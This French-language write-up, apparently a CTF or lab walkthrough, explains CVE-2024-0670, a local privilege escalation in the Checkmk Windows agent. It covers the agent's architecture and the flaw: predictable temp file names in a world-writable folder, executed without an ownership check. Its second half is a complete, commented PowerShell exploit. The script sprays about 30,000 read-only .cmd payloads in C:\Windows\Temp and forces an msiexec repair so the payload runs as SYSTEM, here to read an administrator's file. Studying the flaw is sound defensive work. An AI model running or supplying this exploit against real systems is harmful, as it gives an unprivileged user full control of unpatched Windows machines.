# Elévation de privilèges via Checkmk Agent

## <mark style="color:red;">CVE-2024-0670 : Élévation de privilèges via Checkmk Agent</mark>

### <mark style="color:blue;">Vue d'ensemble</mark>

**CVE-2024-0670** est une vulnérabilité d'élévation de privilèges locale dans l'agent Checkmk pour Windows. Elle permet à un utilisateur non privilégié d'exécuter du code arbitraire avec les privilèges **NT AUTHORITY\SYSTEM** (le plus haut niveau sous Windows).

> 🎯 **Impact** : Compromission totale du système\
> 📅 **Découverte** : 01/12/2023 par Michael Baer (SEC Consult)\
> 🔧 **Patch** : Mars 2024 (Werk #16361)\
> ⚠️ **Complexité** : Moyenne (nécessite accès local)

***

### <mark style="color:blue;">Qu'est-ce que Checkmk ?</mark>

#### <mark style="color:green;">Présentation</mark>

**Checkmk** est une solution de **supervision informatique** (monitoring) qui surveille :

* Les serveurs (Windows, Linux, etc.)
* Les services (HTTP, DNS, SQL, etc.)
* Les ressources système (CPU, mémoire, disques)
* Le réseau et les applications

#### <mark style="color:$success;">Architecture</mark>

```
┌──────────────────────┐          ┌─────────────────────────┐
│  Serveur Checkmk     │◄────────►│  Machine supervisée     │
│  (Monitoring)        │  TCP     │  (Agent installé)       │
│                      │  6556    │                         │
└──────────────────────┘          └─────────────────────────┘
                                   │
                                   ├─ check_mk_agent.exe
                                   │  (collecte données)
                                   │
                                   └─ cmk-agent-ctl.exe
                                      (gestion TLS/config)
```

#### <mark style="color:green;">Composants de l'agent Windows</mark>

| Composant                | Rôle                                                          | Privilèges |
| ------------------------ | ------------------------------------------------------------- | ---------- |
| **check\_mk\_agent.exe** | Collecte les métriques système (CPU, RAM, disques, processus) | SYSTEM     |
| **cmk-agent-ctl.exe**    | Gère la communication TLS avec le serveur Checkmk             | SYSTEM     |
| **Service Windows**      | `Check_MK_Agent` ou `CheckMKService`                          | SYSTEM     |

#### <mark style="color:green;">Fonctionnement normal</mark>

1. **Collecte** : `check_mk_agent.exe` lit les infos système via `wmic`, `perfmon`, registry
2.  **Formatage** : Génère une sortie texte structurée :

    ```
    <<<cpu>>>2.3 1.8 0.9<<<mem>>>MemTotal: 8192MemFree: 3072
    ```
3. **Transmission** : Le serveur interroge l'agent via TCP 6556 ou TLS
4. **Analyse** : Le serveur parse les données pour créer dashboards et alertes

***

### <mark style="color:blue;">La vulnérabilité CVE-2024-0670</mark>

#### Principe technique (simplifié)

Imagine que tu demandes à un majordome (l'agent Checkmk) de te préparer un café. Le majordome a l'habitude de mettre sa tasse toujours au même endroit avant de la remplir.

**Le problème** : Si quelqu'un d'autre place une tasse empoisonnée à cet endroit AVANT que le majordome arrive, le majordome va utiliser cette tasse au lieu de la sienne... et te servir du poison.

C'est exactement ce qui se passe ici, mais avec des fichiers au lieu de tasses ! ☕→💀

#### Explication technique détaillée

**1. La cause racine (Root Cause)**

L'agent Checkmk a une **mauvaise gestion des fichiers temporaires** :

**Problème #1 : Noms de fichiers prévisibles**

```
C:\Windows\Temp\cmk_all_<PID>_<counter>.cmd
                        ^^^^   ^^^^^^^
                        |      └─ Compteur (0, 1, 2...)
                        └─ Process ID (nombre prévisible)
```

**Problème #2 : Permissions trop larges**

* `C:\Windows\Temp` est **accessible en écriture** pour tous les utilisateurs
* Un attaquant local peut créer des fichiers dedans

**Problème #3 : Pas de vérification**

* L'agent ne vérifie **pas** s'il est le propriétaire du fichier
* Si le fichier existe déjà, l'agent l'**utilise directement**
* Le fichier est exécuté avec les privilèges **SYSTEM** (car l'agent tourne en SYSTEM)

**2. Type de vulnérabilité**

C'est une **TOCTOU** (Time-Of-Check to Time-Of-Use) :

* **Time of Check** : L'agent vérifie si le fichier existe
* **Time of Use** : L'agent utilise le fichier
* **Problème** : Entre ces deux moments, un attaquant peut **substituer** le fichier

***

### <mark style="color:blue;">Exploitation pratique</mark>

#### <mark style="color:$success;">Vue d'ensemble de l'attaque</mark>

```
┌─────────────────────────────────────────────────────────────┐
│ 1. PRÉPARATION (Attaquant = utilisateur standard)          │
│    Créer des fichiers .cmd malveillants avec noms          │
│    prévisibles dans C:\Windows\Temp                         │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 2. SPRAY (Attaquant)                                        │
│    Créer des milliers de fichiers pour couvrir tous        │
│    les PIDs possibles : cmk_all_500_0.cmd à                │
│    cmk_all_15000_1.cmd                                      │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 3. TRIGGER (Attaquant)                                      │
│    Déclencher une réparation MSI de Checkmk :              │
│    msiexec.exe /fa <checkmk.msi> /qn                        │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 4. EXÉCUTION (Agent Checkmk en SYSTEM)                     │
│    L'agent tente de créer cmk_all_<PID>_<counter>.cmd      │
│    → Le fichier existe déjà (créé par attaquant)           │
│    → L'agent EXÉCUTE le fichier malveillant                │
│    → Code malveillant s'exécute en SYSTEM !                │
└─────────────────────────────────────────────────────────────┘
```

#### Script d'exploitation (décortiqué)

```powershell
# ===== ÉTAPE 1 : CRÉER LE PAYLOAD =====
# Ce code sera exécuté par SYSTEM
$OutputFile = "C:\Users\monitoring_svc\Documents\root_output.txt"
$PayloadCommand = "type C:\Users\Administrator\Desktop\root.txt > `"$OutputFile`""
$BatchPayload = "@echo off`r`n$PayloadCommand"

# Explication :
# - On veut lire root.txt (accessible uniquement par Administrator)
# - SYSTEM peut lire n'importe quel fichier
# - On redirige le contenu vers un fichier qu'on pourra lire
```

```powershell
# ===== ÉTAPE 2 : TROUVER L'INSTALLEUR CHECKMK =====
$msi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' |
        Where-Object { $_.DisplayName -like '*mk*' } |
        Select-Object -First 1).LocalPackage

# Explication :
# - On cherche dans la registry le chemin du .msi de Checkmk
# - Exemple : C:\Windows\Installer\1e6f2.msi
# - On en aura besoin pour déclencher une "réparation"
```

```powershell
# ===== ÉTAPE 3 : FILE SPRAYING (BOMBARDEMENT DE FICHIERS) =====
foreach ($ctr in 0..1) {  # Counter : 0 et 1
    for ($ProcessID = 500; $ProcessID -le 15000; $ProcessID++) {
        
        # Nom du fichier que l'agent va chercher
        $filePath = "C:\Windows\Temp\cmk_all_${ProcessID}_${ctr}.cmd"
        
        # Écrire notre payload dedans
        [System.IO.File]::WriteAllText($filePath, $BatchPayload, [System.Text.Encoding]::ASCII)
        
        # CRITIQUE : Mettre en lecture seule
        # → L'agent ne pourra PAS le supprimer/modifier
        # → Il sera FORCÉ de l'exécuter tel quel
        Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true
    }
}

# Résultat : ~30 000 fichiers créés !
# cmk_all_500_0.cmd, cmk_all_500_1.cmd, cmk_all_501_0.cmd, etc.
```

**Pourquoi autant de fichiers ?**

* On ne sait pas quel PID aura le processus de l'agent
* On "vaporise" tous les PIDs possibles de 500 à 15000
* Dès que l'agent démarre avec un PID dans cette plage → BINGO !

```powershell
# ===== ÉTAPE 4 : DÉCLENCHER L'EXPLOITATION =====
Start-Process "msiexec.exe" `
    -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log" `
    -Wait

# Explication des options :
# /fa  : Force une réparation (reinstall All)
# /qn  : Mode silencieux (Quiet, No UI)
# /l*vx : Log verbeux dans cmk_repair.log
```

**Que se passe-t-il maintenant ?**

1. `msiexec.exe` répare Checkmk
2. Le service `check_mk_agent` redémarre avec un certain PID (ex: 7234)
3. L'agent cherche à créer `C:\Windows\Temp\cmk_all_7234_0.cmd`
4. **Le fichier existe déjà** (créé par nous !)
5. L'agent **exécute notre code malveillant** en SYSTEM
6. Notre payload lit `C:\Users\Administrator\Desktop\root.txt` et le copie dans notre dossier

***
